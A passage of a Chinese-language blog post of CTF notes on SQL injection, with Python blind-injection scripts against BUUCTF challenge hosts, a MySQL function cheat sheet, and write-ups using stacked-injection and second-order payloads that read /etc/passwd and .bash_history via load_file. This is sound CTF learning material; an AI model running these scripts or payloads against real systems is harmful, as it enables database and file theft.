-*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5dbbc107-a871-4d45-940a-3b2712330fee.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload</span>(<span class="params">i,j</span>):</span></span><br><span class="line">    <span class="comment"># sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span></span><br><span class="line">    <span class="comment"># sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span></span><br><span class="line">    <span class="comment"># sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span></span><br><span class="line">    sql = <span class="string">&quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span>%(i,j)</span><br><span class="line">    data = &#123;<span class="string">&quot;id&quot;</span>:sql&#125;</span><br><span class="line">    r = requests.get(url,params=data)</span><br><span class="line">    <span class="comment"># print (r.url)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Click&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        res = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>) :</span><br><span class="line">        <span class="built_in">print</span>(i,<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        low = <span class="number">31</span></span><br><span class="line">        high = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high :</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            res = payload(i,mid)</span><br><span class="line">            <span class="keyword">if</span> res :</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line">        f = <span class="built_in">int</span>((low + high + <span class="number">1</span>)) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (f == <span class="number">127</span> <span class="keyword">or</span> f == <span class="number">31</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># print (f)</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(f)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag=&#x27;</span>,flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://35737a35-63b7-4e60-a584-e5cbbead6dc6.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line"><span class="comment">#give_grandpa_pa_pa_pa</span></span><br><span class="line"></span><br><span class="line">payload_table=<span class="string">&#x27;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)^1&#x27;</span></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">132</span></span><br><span class="line">    mid = (low + high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high):</span><br><span class="line">        payload = payload_table.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        data=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">        mid = (low+high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag +=<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c7f4deb2-e4eb-4cec-a2b4-6014fb5b6c2d.node3.buuoj.cn/search.php?&quot;</span></span><br><span class="line">temp = &#123;<span class="string">&quot;id&quot;</span> : <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">column = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high =<span class="number">128</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        <span class="comment">#库名</span></span><br><span class="line">        temp[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;</span> %(i,mid)</span><br><span class="line">        <span class="comment">#表名</span></span><br><span class="line">        <span class="comment">#temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)^1&quot; %(i,mid)</span></span><br><span class="line">        <span class="comment">#字段名</span></span><br><span class="line">        <span class="comment">#temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot; %(i,mid)</span></span><br><span class="line">        <span class="comment">#内容</span></span><br><span class="line">        <span class="comment">#temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; %(i,mid)</span></span><br><span class="line">        r = requests.get(url,params=temp)</span><br><span class="line">        time.sleep(<span class="number">0.04</span>)</span><br><span class="line">        <span class="built_in">print</span>(low,high,mid,<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Click&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid =(low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    column +=<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(column)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;All:&quot;</span> ,column)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">a) Version()；当前 mysql 的版本</span><br><span class="line">b) Database();当前网站使用的数据库</span><br><span class="line">c) User();当前 MySQL 的用户</span><br><span class="line">d) system_user(); 系统用户名</span><br><span class="line">e）session_user();连接数据库的用户名</span><br><span class="line">f)current_user;当前用户名</span><br><span class="line">g)load_file();读取本地文件</span><br><span class="line">h)length(str) : 返回给定字符串的长度，如 length(“string”)=6</span><br><span class="line">i)substr(string,start,length) : 对于给定字符串string，从start位开始截取，截取length长度 ,如 substr(“chinese”,3,2)=“in”</span><br><span class="line">substr()、stbstring()、mid() 三个函数的用法、功能均一致</span><br><span class="line">j)concat(username)：将查询到的username连在一起，默认用逗号分隔</span><br><span class="line">concat(str1,’’,str2)：将字符串str1和str2的数据查询到一起，中间用连接</span><br><span class="line">group_concat(username) ：将username数据查询在一起，用逗号连接</span><br><span class="line">left(m,n) --从左向右截取字符串 m 返回其前 n 位</span><br><span class="line">substr(m,1,1) --取字符串 m 的左边第一位起，1 字长的字符串</span><br><span class="line">ascii(m) --返回字符 m 的 ASCII 码</span><br><span class="line">base64(m)—返回字符 m 的 base64 编码 • if(str1,str2,str3)–如果 str1 正确就执行 str2，否则执行 str3</span><br><span class="line">sleep(m)–使程序暂停 m 秒</span><br><span class="line">length(m) --返回字符串 m 的长度</span><br><span class="line">count(column_name) --返回指定列的值的数目</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/160584#h2-7">CTF中几种通用的sql盲注手法和注入的一些tips - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p><strong>找闭合方式：先测试正确的回显，然后构造语句，让他们报错，慢慢修改语句，直到页面回显正常</strong></p>
<h1 id="题"><a href="#题" class="headerlink" title="题"></a>题</h1><p>[BUUCTF<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ophxc/p/13160638.html?msclkid=13cbb19da7ee11eca92f21a34f488ed0#">归纳]sql注入相关题目 - op_hxc - 博客园 (cnblogs.com)</a></p>
<h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb1"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb1" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb1"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb1</h2><p>用御剑扫描之后可以得到robots.txt文件，这个文件中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: *.php.bak</span><br></pre></td></tr></table></figure>

<p>但是文件名字不知道，在查看源码中得到image.php?id=1   </p>
<p>从这点可以推测到存在sql注入，并且文件的名字为image</p>
<p>访问image.php.bak,可以得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;<span class="comment">//包含config.php文件</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;<span class="comment">//三目运算符，id为空则赋值为1，不为空则获得它的值</span></span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;<span class="comment">//path等同于上面</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);<span class="comment">//转义</span></span><br><span class="line"><span class="variable">$path</span>=addslashes(<span class="variable">$path</span>);<span class="comment">//转义</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);<span class="comment">//第一个是转义字符，guo&#x27;l</span></span><br><span class="line"><span class="variable">$path</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile(<span class="variable">$path</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="-2"><a href="#-2" class="headerlink" title=""></a></h1><h2 id="攻防世界-supersqli"><a href="#攻防世界-supersqli" class="headerlink" title="攻防世界-supersqli"></a>攻防世界-supersqli</h2><p>打开是sql注入，但是过滤了好多东西 /select|update|delete|drop|insrt|where|./i</p>
<p>网上搜了搜开始尝试着绕过，但是尝试了好几种绕过方法都不行，看了一下wp，知道是要采用堆叠注入，第一次知道，网上开搜。</p>
<p>1.查数据库</p>
<p>-1’;show databases;#</p>
<p>但是不明白，感觉查这个库没啥子作用</p>
<p>2.查表</p>
<p>-1’;show tables;#</p>
<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>出现了两个表单，都查询看一下嘛</p>
<p>3.查列表</p>
<p>（1）-1‘;show columns from <code>1919810931114514</code>;#</p>
<p>​    字符串为表名时进行操作时要加反引号``这两个标记符号，弄了我好长时间，没注意到反引号这玩意，错把单引号当反引号</p>
<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述">    flag ,NO字段</p>
<p>（2）-1’;show columns from <code>words</code>;#</p>
<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>id,NO等字段</p>
<p>因为这里是字段，而不是列名，不能直接进行查询。而且通过观察int()发现，写入到的内容存到了id中，推测查询的是words表中的内容，即输入的内容都会在words这个表中进行查询，但是flag不在这个表中</p>
<p>4.<strong>查询字段内容</strong></p>
<p>有两种方法</p>
<p>1.改表名</p>
<p>根据在words表里发现id字段与查询框里的出的数据类型相同，一个数字，一个字符串，所以猜测默认查询的就是words表，inject（搜索框中）值应该赋给了id<br>利用：我们可以将含有flag字段的表命名为word，然后修改字段名字，不就查询到我们想要的结果！（前提是这里rename，alert关键字 没有做过滤）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50); #</span><br></pre></td></tr></table></figure>

<p>查看flag</p>
<p>1’ or 1=1#</p>
<p>2.预编译来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>‘;sEt @sql = CONCAT(‘se’,‘lect * from <code>1919810931114514</code>;’); 进行预编译<br>prEpare stmt from @sql; 设置变量<br>EXECUTE stmt;# 执行</p>
<p>对预编译不是很了解，了解之后再做补充吧！！</p>
<p>最后，不愧是强网杯的题，真是难呀</p>
<p>参考文章：[(40条消息) 攻防世界-supersqli详解_Mr_helloword的博客-CSDN博客](</p>
<h2 id="网鼎杯-2018-Comment1"><a href="#网鼎杯-2018-Comment1" class="headerlink" title="[网鼎杯 2018]Comment1"></a>[网鼎杯 2018]Comment1</h2><p>先扫描，得到git，然后githacker得到源码，发现源码不完整，需要进行恢复</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log --reflog</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</span><br></pre></td></tr></table></figure>

<p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;<span class="comment">//添加到board</span></span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);<span class="comment">//对sql查询</span></span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);<span class="comment">//向客户端发送原始http报头</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);<span class="comment">//对bo_id转义</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;<span class="comment">//对category进行查询,将category提出来</span></span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);<span class="comment">//对sql进行查询</span></span><br><span class="line">    <span class="variable">$num</span> = mysql_num_rows(<span class="variable">$result</span>);<span class="comment">//获取查询行数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = mysql_fetch_array(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];<span class="comment">//从结果集中取得一行作为关联数组，或数字数组，或二者兼有</span></span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);<span class="comment">//对concent内容进行转义</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,//提出来的category</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;, //comment中的concent</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;<span class="comment">//对comment中的</span></span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);<span class="comment">//查询经转义后的增加的内容</span></span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);<span class="comment">//在comment.php中进行查询</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在comment.php中进行查询，在comment中插入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set category = <span class="string">&#x27;$category&#x27;</span>,</span><br><span class="line">               content = <span class="string">&#x27;$content&#x27;</span>,</span><br><span class="line">               bo_id = <span class="string">&#x27;$bo_id&#x27;</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>

<p>在common.php文件中进行查询</p>
<p>查询语句不能有引号</p>
<p>‘,content=(select load_file(“/etc/passwd”)),/*</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin libuuid:x:100:101::/var/lib/libuuid: syslog:x:101:104::/home/syslog:/bin/false mysql:x:102:105:MySQL Server,,,:/var/lib/mysql:/bin/false www:x:500:500:www:/home/www:/bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="D:\github.io\source_posts\sql.assets\1999159-20210120000909411-365368467.jpg" alt="img"></p>
<p>‘,content=(select load_file(“//home/www/.bash_history”)),/*</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start</span><br></pre></td></tr></table></figure>

<p>切换到/tmp/ unzip html.zip，删除html.zip，再将html复制到/var/www/，再切换到/var/www/html/，删除该目录下的.DS_Store，但是/tmp/html/.DS_Store没被删除</p>
<p>​    ‘,content=(select hex(load_file(“/tmp/html/.DS_Store”))),/*</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解码后得到  只显示一部分，太长了</span><br><span class="line">flag_8946e1ff1ee3e40f.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>‘,content=(select hex(load_file(“/tmp/html/flag_8946e1ff1ee3e40f.php”))),/*</p>
<p>不正确，换个路径</p>
<p>‘,content=(select hex(load_file(“/var/www/html/flag_8946e1ff1ee3e40f.php”))),/*</p>
<p>3C3F7068700A0924666C61673D22666C61677B39613162333738392D363165342D343333312D383436332D6631656330666230613439317D223B0A3F3E0A</p>
<p>卡点：</p>
<ol>
<li>二次注入，在common.php文件中进行查询，在case comment 中只有category，来自write</li>
<li>sql查询语句不能有引号</li>
<li>在comment中，只有category没有被转义，用它构造出来的sql语句才能执行成功，content是comment.php文件中的关键（猜测），不能采用联合注入将其过滤。而是构造新的content</li>
<li>查表查不出来，因此利用加载文件</li>
</ol>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
                        
                    
                        
                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
                        
                    
                </ul>
            
        </div>
        
    <div id='gitalk-container' class="comment link"
		data-enable='true'
        data-ae='true'
        data-ci=''
        data-cs=''
        data-r=''
        data-o=''
